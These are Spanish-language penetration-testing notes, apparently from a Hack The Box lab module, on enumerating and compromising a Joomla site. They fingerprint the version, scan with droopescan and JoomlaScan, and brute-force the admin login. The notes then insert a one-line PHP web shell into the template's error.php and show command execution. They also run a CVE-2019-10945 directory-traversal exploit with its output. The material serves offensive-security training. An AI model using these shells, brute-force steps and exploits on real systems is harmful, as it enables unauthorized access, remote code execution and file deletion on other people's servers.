---
tags:
  - Enumeración
  - CMS
---

## Enumeración
API de Joomla donde vemos algunos de sus directorios
https://developer.joomla.org/about/stats/api.html

```shell
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
    "data": {
        "cms_version": {
            "3.0": 0,
            "3.1": 0,
            "3.10": 3.49,
            "3.2": 0.01,
            "3.3": 0.02,
            "3.4": 0.05,
            "3.5": 13,
            "3.6": 24.29,
            "3.7": 8.5,
            "3.8": 18.84,
            "3.9": 30.28,
            "4.0": 1.52,
            "4.1": 0
        },
        "total": 2776276
    }
}
```


A menudo podemos tomar las huellas digitales de Joomla mirando la fuente de la página, que nos dice que estamos tratando con un sitio de Joomla.

```shell
curl -s http://dev.inlanefreight.local/ | grep Joomla

	<meta name="generator" content="Joomla! - Open Source Content Management" />


<SNIP>
```


El `robots.txt` el archivo de un sitio de Joomla a menudo se verá así:

```shell-session
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

---

Podemos tomar las huellas dactilares de la versión de Joomla si el `README.txt` el archivo está presente.

```shell
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

---

En ciertas instalaciones de Joomla, es posible que podamos tomar las huellas dactilares de la versión de los archivos JavaScript en el `media/system/js/` directorio o navegando a `administrator/manifests/files/joomla.xml`.

```shell-session
vcrdcr@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.9.4</version>
  <creationDate>March 2019</creationDate>
  
 <SNIP>
```

El `cache.xml` el archivo puede ayudarnos a darnos la versión aproximada. Se encuentra en `plugins/system/cache/cache.xml`.

---

### Droopescan (No muy efectiva en Joomla)

[Droopescan](https://github.com/droope/droopescan) es un escáner basado en plugins que funciona para SilverStripe, WordPress y Drupal con funcionalidad limitada para Joomla y Moodle.

Podemos clonar el repositorio de Git e instalarlo manualmente o instalarlo a través de `pip`.

```shell
sudo pip3 install droopescan

Collecting droopescan
  Downloading droopescan-1.45.1-py2.py3-none-any.whl (514 kB)
     |████████████████████████████████| 514 kB 5.8 MB/s
	 
<SNIP>
```

Hagamos un escaneo y veamos qué aparece.

```shell-session
vcrdcr@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/

[+] Possible version(s):                                                        
    3.8.10
    3.8.11
    3.8.11-rc
    3.8.12
    3.8.12-rc
    3.8.13
    3.8.7
    3.8.7-rc
    3.8.8
    3.8.8-rc
    3.8.9
    3.8.9-rc

[+] Possible interesting urls found:
    Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
    Login page. - http://dev.inlanefreight.local/administrator/
    License file. - http://dev.inlanefreight.local/LICENSE.txt
    Version attribute contains approx version - http://dev.inlanefreight.local/plugins/system/cache/cache.xml

[+] Scan finished (0:00:01.523369 elapsed)
```


### JoomlaScan (Desactualizada pero útil)

JoomlaScan es una herramienta de Python inspirada en el ahora desaparecido OWASP [joomscan](https://github.com/OWASP/joomscan) herramienta. `JoomlaScan` está un poco desactualizado y requiere que se ejecute Python2.7. Podemos ponerlo en funcionamiento asegurándonos primero de que se instalen algunas dependencias.

```shell-session
vcrdcr@htb[/htb]$ sudo python2.7 -m pip install urllib3
vcrdcr@htb[/htb]$ sudo python2.7 -m pip install certifi
vcrdcr@htb[/htb]$ sudo python2.7 -m pip install bs4
```

Aunque un poco desactualizado, puede ser útil en nuestra enumeración. Hagamos un escaneo.

```shell-session
vcrdcr@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local

-------------------------------------------
      	     Joomla Scan                  
   Usage: python joomlascan.py <target>    
    Version 0.5beta - Database Entries 1233
         created by Andrea Draghetti       
-------------------------------------------
Robots file found: 	 	 > http://dev.inlanefreight.local/robots.txt
No Error Log found

Start scan...with 10 concurrent threads!
Component found: com_actionlogs	 > http://dev.inlanefreight.local/index.php?option=com_actionlogs
	 On the administrator components
Component found: com_admin	 > http://dev.inlanefreight.local/index.php?option=com_admin
	 On the administrator components
Component found: com_ajax	 > http://dev.inlanefreight.local/index.php?option=com_ajax
	 But possibly it is not active or protected
	 LICENSE file found 	 > http://dev.inlanefreight.local/administrator/components/com_actionlogs/actionlogs.xml
	 LICENSE file found 	 > http://dev.inlanefreight.local/administrator/components/com_admin/admin.xml
	 LICENSE file found 	 > http://dev.inlanefreight.local/administrator/components/com_ajax/ajax.xml
	 
<SNIP>
```


### Joomla-brute

Podemos usar esto [joomla-brute](https://github.com/ajnik/joomla-bruteforce) para intentar forzar brutamente el inicio de sesión.

```shell-session
vcrdcr@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
admin:admin
```


## Ataque

### Abusar de la Funcionalidades Incorporadas

iniciemos sesión en el backend de destino en `http://dev.inlanefreight.local/administrator`. Una vez que haya iniciado sesión, podemos ver muchas opciones disponibles para nosotros. Para nuestros propósitos, nos gustaría agregar un fragmento de código PHP para obtener RCE. Podemos hacer esto personalizando una plantilla.

>Si recibe un error que indica "Se ha producido un error. Llame a una función miembro format() en null" después de iniciar sesión, navegue a "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" y deshabilite el complemento "Quick Icon - PHP Version Check". Esto permitirá que el panel de control se muestre correctamente.


![Panel de control de Joomla con notificación de actualización, advertencia de PHP y solicitud de permiso de estadísticas. Muestra mensajes posteriores a la instalación y acciones del usuario.](https://academy.hackthebox.com/storage/modules/113/joomla_admin.png)

Desde aquí, podemos hacer clic en `Templates` en la parte inferior izquierda debajo `Configuration` para abrir el menú de plantillas.

![Página de plantillas de Joomla solicitando permiso para recopilar estadísticas, mostrando estilos Beez3 y Protostar.](https://academy.hackthebox.com/storage/modules/113/joomla_templates.png)

A continuación, podemos hacer clic en un nombre de plantilla. Elegimos `protostar` bajo el `Template` encabezado de columna. Esto nos llevará al `Templates: Customise` página.

![Página de personalización de plantillas de Joomla solicitando permiso para recopilar estadísticas, con opciones para seleccionar y administrar archivos.](https://academy.hackthebox.com/storage/modules/113/joomla_customise.png)



Finalmente, podemos hacer clic en una página para extraer la fuente de la página. Es una buena idea acostumbrarse a usar nombres y parámetros de archivos no estándar para nuestros shells web para no hacerlos fácilmente accesibles a un atacante "conducción" durante la evaluación. También podemos proteger con contraseña e incluso limitar el acceso a nuestra dirección IP de origen.

Elegimos el `error.php` página. Agregaremos una línea única de PHP para obtener la ejecución de código de la siguiente manera.

Código: php

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```


![Editor de plantillas Joomla para Protostar, edición de error.php con una vulnerabilidad de comando del sistema y una solicitud de permiso de estadísticas.](https://academy.hackthebox.com/storage/modules/113/joomla_edited.png)

Una vez que esto esté adentro, haga clic en `Save & Close` en la parte superior y confirmar la ejecución de código usando `cURL`.

```shell
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Aprovechamiento de Vulnerabilidades Conocidas

Investigando un poco, encontramos que esta versión de Joomla es probablemente vulnerable a [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) que es una vulnerabilidad de salto de directorio y eliminación de archivos autenticados. Podemos usar [esto](https://www.exploit-db.com/exploits/46710) explote el script para aprovechar la vulnerabilidad y enumere el contenido de la webroot y otros directorios. Se puede encontrar la versión python3 de este mismo script [aquí](https://github.com/dpgg101/CVE-2019-10945). También podemos usarlo para eliminar archivos (no recomendado). Esto podría conducir al acceso a archivos confidenciales, como un archivo de configuración o credenciales de almacenamiento de scripts, si podemos acceder a él a través de la URL de la aplicación. Un atacante también podría causar daños al eliminar los archivos necesarios si el usuario del servidor web tiene los permisos adecuados.

Podemos ejecutar el script especificando el `--url`, `--username`, `--password`, y `--dir` banderas. Como pentesters, esto solo nos sería útil si el portal de inicio de sesión de administrador no es accesible desde el exterior, ya que, armados con credenciales de administrador, podemos obtener la ejecución remota de código, como vimos anteriormente.

  Atacando a Joomla

```shell-session
vcrdcr@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

